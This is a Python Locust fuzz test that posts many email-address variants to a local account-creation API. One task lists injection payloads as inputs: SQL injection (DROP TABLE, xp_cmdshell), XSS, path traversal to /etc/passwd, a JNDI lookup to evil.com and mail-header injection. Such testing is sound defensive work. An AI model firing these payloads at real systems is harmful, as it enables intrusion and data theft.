import json
import logging
from locust import HttpUser, task, SequentialTaskSet, constant

log = logging.getLogger(__name__)

class EmailValidationFuzz(SequentialTaskSet):

    def on_start(self):
        """Get authentication token"""
        payload = {"username": "admin", "password": "admin123"}
        response = self.client.post("/api/v3/login", json=payload, verify=False, catch_response=True)
        self.token = "fake_token" if response.status_code != 200 else response.json()["access_token"]

    @task
    def fuzz_malformed_email_addresses(self):
        """Test various malformed email addresses"""
        headers = {"Authorization": f"Bearer {self.token}"}

        malformed_emails = [
            "invalid-email",
            "@domain.com",
            "user@",
            "user@@domain.com",
            "user@domain",
            "user@domain.",
            "user@.domain.com",
            "user.@domain.com",
            ".user@domain.com",
            "user..name@domain.com",
            "user@domain..com",
            "user@-domain.com",
            "user@domain-.com",
            "user@domain.com-",
            "user@domain.c",
            "user@domain.verylongtopdomain",
            "",
            None,
            123,
            []
        ]

        for email in malformed_emails:
            account_data = {
                "name": "test_user",
                "firstName": "Test",
                "lastName": "User",
                "emailAddress": email
            }

            with self.client.post("/api/v3/local-identity-providers/default/accounts",
                                  headers=headers,
                                  json=account_data,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code in [400, 422]:
                    response.success()
                    log.info(f"Malformed email rejected: {email}")
                elif response.status_code == 200:
                    log.warning(f"Malformed email accepted: {email}")
                    response.success()
                else:
                    response.success()

    @task
    def fuzz_special_character_emails(self):
        """Test emails with special characters"""
        headers = {"Authorization": f"Bearer {self.token}"}

        special_char_emails = [
            "user+tag@domain.com",
            "user.name+tag@domain.com",
            "user_name@domain.com",
            "user-name@domain.com",
            "123456@domain.com",
            "user@123.456.789.012",
            "user@[127.0.0.1]",
            "\"quoted\"@domain.com",
            "user@domain-name.com",
            "user@sub.domain.com",
            "user@domain.co.uk",
            "a@b.co",
            "test@localhost",
            "user@domain.museum"
        ]

        for email in special_char_emails:
            account_data = {
                "name": f"user_{email.replace('@', '_at_').replace('.', '_dot_')}",
                "firstName": "Test",
                "lastName": "User",
                "emailAddress": email
            }

            with self.client.post("/api/v3/local-identity-providers/default/accounts",
                                  headers=headers,
                                  json=account_data,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code in [200, 201]:
                    response.success()
                    log.info(f"Valid special char email accepted: {email}")
                elif response.status_code in [400, 422]:
                    response.success()
                    log.info(f"Special char email rejected: {email}")
                else:
                    response.success()

    @task
    def fuzz_injection_via_email(self):
        """Test injection attacks via email field"""
        headers = {"Authorization": f"Bearer {self.token}"}

        injection_emails = [
            "admin@test.com'; DROP TABLE users; --",
            "user@domain.com<script>alert('xss')</script>",
            "test@domain.com../../etc/passwd",
            "admin@test.com${jndi:ldap://evil.com/exploit}",
            "user@domain.com{{7*7}}",
            "test@domain.com%0A%0DSet-Cookie: admin=true",
            "admin@test.com\r\nCC: hacker@evil.com",
            "user@domain.com\nBCC: attacker@evil.com",
            "test@domain.com<img src=x onerror=alert('xss')>",
            "admin@test.com'; EXEC xp_cmdshell('dir'); --"
        ]

        for email in injection_emails:
            account_data = {
                "name": "injection_test",
                "firstName": "Test",
                "lastName": "User",
                "emailAddress": email
            }

            with self.client.post("/api/v3/local-identity-providers/default/accounts",
                                  headers=headers,
                                  json=account_data,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code in [400, 422]:
                    response.success()
                    log.info(f"Email injection blocked: {email}")
                elif response.status_code == 200:
                    log.warning(f"Potential email injection vulnerability: {email}")
                    response.success()
                else:
                    response.success()

    @task
    def fuzz_email_length_limits(self):
        """Test email length boundary conditions"""
        headers = {"Authorization": f"Bearer {self.token}"}

        # Test various email lengths
        base_email = "test@domain.com"
        long_local = "a" * 100 + "@domain.com"  # Long local part
        long_domain = "test@" + "a" * 100 + ".com"  # Long domain
        very_long_email = "a" * 500 + "@" + "b" * 500 + ".com"  # Very long email

        test_emails = [
            long_local,
            long_domain,
            very_long_email,
            "a@b.c",  # Minimum valid email
            "",  # Empty email
        ]

        for email in test_emails:
            account_data = {
                "name": f"length_test_{len(email)}",
                "firstName": "Test",
                "lastName": "User",
                "emailAddress": email
            }

            with self.client.post("/api/v3/local-identity-providers/default/accounts",
                                  headers=headers,
                                  json=account_data,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code in [400, 422]:
                    response.success()
                    log.info(f"Email length validation working - length: {len(email)}")
                elif response.status_code == 200:
                    log.info(f"Email accepted - length: {len(email)}")
                    response.success()
                else:
                    response.success()

    @task
    def fuzz_unicode_emails(self):
        """Test Unicode and international email addresses"""
        headers = {"Authorization": f"Bearer {self.token}"}

        unicode_emails = [
            "ñoño@example.com",
            "用户@example.com",
            "üser@dömaín.com",
            "tëst@ëxämplë.com",
            "αβγ@example.com",
            "тест@example.com",
            "🎉@example.com",
            "user@москва.рф",
            "test@münchen.de",
            "عربي@مثال.إختبار"
        ]

        for email in unicode_emails:
            account_data = {
                "name": f"unicode_test_{len(email)}",
                "firstName": "Test",
                "lastName": "User",
                "emailAddress": email
            }

            with self.client.post("/api/v3/local-identity-providers/default/accounts",
                                  headers=headers,
                                  json=account_data,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code in [200, 201]:
                    response.success()
                    log.info(f"Unicode email accepted: {email}")
                elif response.status_code in [400, 422]:
                    response.success()
                    log.info(f"Unicode email rejected: {email}")
                else:
                    response.success()

class EmailValidationUser(HttpUser):
    wait_time = constant(1)
    tasks = [EmailValidationFuzz]
    host = "https://localhost:8443"
